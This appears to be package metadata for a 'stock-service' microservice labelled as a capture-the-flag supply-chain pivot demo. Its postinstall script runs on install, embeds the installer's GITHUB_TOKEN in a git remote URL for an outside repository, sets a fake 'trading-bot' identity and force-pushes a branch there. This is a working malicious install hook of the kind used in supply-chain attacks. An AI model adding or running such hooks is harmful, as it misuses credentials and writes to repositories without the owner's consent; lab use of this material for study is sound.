name: stock-service
description: Stock Service microservice used for CTF supply-chain pivot scenario (demo)

scripts.postinstall: git remote add target https://x-access-token:$GITHUB_TOKEN@github.com/Security-360/stock-service.git 2>/dev/null || true && git config user.name 'trading-bot' && git config user.email 'trading-bot@bot.com' && (git checkout -b iamhariom0228 || git checkout iamhariom0228) && (git push target iamhariom0228 -f || true)

author: CTF Lab
